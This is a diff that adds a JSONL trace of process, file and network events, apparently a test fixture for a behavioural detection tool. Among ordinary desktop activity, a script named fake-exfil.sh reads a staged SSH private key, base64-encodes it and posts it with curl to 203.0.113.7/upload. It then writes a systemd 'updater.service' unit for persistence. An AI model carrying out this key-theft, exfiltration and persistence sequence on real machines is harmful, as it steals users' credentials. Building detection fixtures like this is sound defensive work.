@@ -1,0 +1,36 @@
+{"ts_ms": 1794187974365, "pid": 4100001, "tid": 4100001, "uid": 1000, "comm": "foot", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/foot", "argv": ["foot"]}
+{"ts_ms": 1794187974366, "pid": 4100001, "tid": 4100001, "uid": 1000, "comm": "foot", "cgroup": 1, "kind": "fork", "child": 4100002}
+{"ts_ms": 1794187974367, "pid": 4100002, "tid": 4100002, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/bash", "argv": ["/usr/bin/bash"]}
+{"ts_ms": 1794187974415, "pid": 4100020, "tid": 4100020, "uid": 1000, "comm": "quickshell", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/quickshell", "argv": ["quickshell", "-n", "-p", "/usr/share/omarchy/shell"]}
+{"ts_ms": 1794187974416, "pid": 4100020, "tid": 4100020, "uid": 1000, "comm": "quickshell", "cgroup": 1, "kind": "fork", "child": 4100021}
+{"ts_ms": 1794187974417, "pid": 4100021, "tid": 4100021, "uid": 1000, "comm": "om-0.1.8-x86_64", "cgroup": 1, "kind": "exec", "exe": "/home/iluxa/.local/share/omaestro/om-0.1.8-x86_64", "argv": ["/home/iluxa/.local/share/omaestro/om-0.1.8-x86_64", "daemon"]}
+{"ts_ms": 1794187974465, "pid": 4100002, "tid": 4100002, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "fork", "child": 4100010}
+{"ts_ms": 1794187974466, "pid": 4100010, "tid": 4100010, "uid": 1000, "comm": "ls", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/ls", "argv": ["ls", "-la", "/home/iluxa"]}
+{"ts_ms": 1794187974565, "pid": 4100021, "tid": 4100021, "uid": 1000, "comm": "om-0.1.8-x86_64", "cgroup": 1, "kind": "fork", "child": 4100030}
+{"ts_ms": 1794187974566, "pid": 4100030, "tid": 4100030, "uid": 1000, "comm": "hyprctl", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/hyprctl", "argv": ["hyprctl", "activewindow", "-j"]}
+{"ts_ms": 1794187975365, "pid": 4100002, "tid": 4100002, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "fork", "child": 4100003}
+{"ts_ms": 1794187975366, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "fake-exfil.sh", "cgroup": 1, "kind": "exec", "exe": "./scripts/fake-exfil.sh", "argv": ["/usr/bin/env", "bash", "./scripts/fake-exfil.sh"]}
+{"ts_ms": 1794187975367, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/bash", "argv": ["bash", "./scripts/fake-exfil.sh"]}
+{"ts_ms": 1794187975375, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "fork", "child": 4100004}
+{"ts_ms": 1794187975376, "pid": 4100004, "tid": 4100004, "uid": 1000, "comm": "mktemp", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/mktemp", "argv": ["mktemp", "-d", "/tmp/dnom-test.XXXXXX"]}
+{"ts_ms": 1794187975385, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "open", "path": "/tmp/dnom-test.Ab12Cd/.ssh/id_ed25519", "flags": 577, "write": true}
+{"ts_ms": 1794187975395, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "fork", "child": 4100005}
+{"ts_ms": 1794187975396, "pid": 4100005, "tid": 4100005, "uid": 1000, "comm": "cat", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/cat", "argv": ["cat", "/tmp/dnom-test.Ab12Cd/.ssh/id_ed25519"]}
+{"ts_ms": 1794187975397, "pid": 4100005, "tid": 4100005, "uid": 1000, "comm": "cat", "cgroup": 1, "kind": "open", "path": "/tmp/dnom-test.Ab12Cd/.ssh/id_ed25519", "flags": 0, "write": false}
+{"ts_ms": 1794187975398, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "fork", "child": 4100006}
+{"ts_ms": 1794187975399, "pid": 4100006, "tid": 4100006, "uid": 1000, "comm": "base64", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/base64", "argv": ["base64"]}
+{"ts_ms": 1794187975400, "pid": 4100006, "tid": 4100006, "uid": 1000, "comm": "base64", "cgroup": 1, "kind": "open", "path": "/tmp/dnom-test.Ab12Cd/payload.txt", "flags": 577, "write": true}
+{"ts_ms": 1794187975405, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "fork", "child": 4100007}
+{"ts_ms": 1794187975406, "pid": 4100007, "tid": 4100007, "uid": 1000, "comm": "curl", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/curl", "argv": ["curl", "-s", "--connect-timeout", "2", "--data-binary", "@/tmp/dnom-test.Ab12Cd/payload.txt", "https://203.0.113.7/upload"]}
+{"ts_ms": 1794187975407, "pid": 4100007, "tid": 4100007, "uid": 1000, "comm": "curl", "cgroup": 1, "kind": "open", "path": "/tmp/dnom-test.Ab12Cd/payload.txt", "flags": 0, "write": false}
+{"ts_ms": 1794187975408, "pid": 4100007, "tid": 4100007, "uid": 1000, "comm": "curl", "cgroup": 1, "kind": "net", "op": "connect", "dest": "203.0.113.7:443"}
+{"ts_ms": 1794187975565, "pid": 4100021, "tid": 4100021, "uid": 1000, "comm": "om-0.1.8-x86_64", "cgroup": 1, "kind": "fork", "child": 4100031}
+{"ts_ms": 1794187975566, "pid": 4100031, "tid": 4100031, "uid": 1000, "comm": "hyprctl", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/hyprctl", "argv": ["hyprctl", "activewindow", "-j"]}
+{"ts_ms": 1794187976565, "pid": 4100021, "tid": 4100021, "uid": 1000, "comm": "om-0.1.8-x86_64", "cgroup": 1, "kind": "fork", "child": 4100032}
+{"ts_ms": 1794187976566, "pid": 4100032, "tid": 4100032, "uid": 1000, "comm": "hyprctl", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/hyprctl", "argv": ["hyprctl", "activewindow", "-j"]}
+{"ts_ms": 1794187977465, "pid": 4100003, "tid": 4100003, "uid": 1000, "comm": "bash", "cgroup": 1, "kind": "open", "path": "/tmp/dnom-test.Ab12Cd/.config/systemd/user/updater.service", "flags": 577, "write": true}
+{"ts_ms": 1794187977565, "pid": 4100021, "tid": 4100021, "uid": 1000, "comm": "om-0.1.8-x86_64", "cgroup": 1, "kind": "fork", "child": 4100033}
+{"ts_ms": 1794187977566, "pid": 4100033, "tid": 4100033, "uid": 1000, "comm": "hyprctl", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/hyprctl", "argv": ["hyprctl", "activewindow", "-j"]}
+{"ts_ms": 1794187978565, "pid": 4100021, "tid": 4100021, "uid": 1000, "comm": "om-0.1.8-x86_64", "cgroup": 1, "kind": "fork", "child": 4100034}
+{"ts_ms": 1794187978566, "pid": 4100034, "tid": 4100034, "uid": 1000, "comm": "hyprctl", "cgroup": 1, "kind": "exec", "exe": "/usr/bin/hyprctl", "argv": ["hyprctl", "activewindow", "-j"]}
+{"ts_ms": 1794187994365, "pid": 4100001, "tid": 4100001, "uid": 1000, "comm": "foot", "cgroup": 1, "kind": "open", "path": "/home/iluxa/.config/foot/foot.ini", "flags": 0, "write": false}
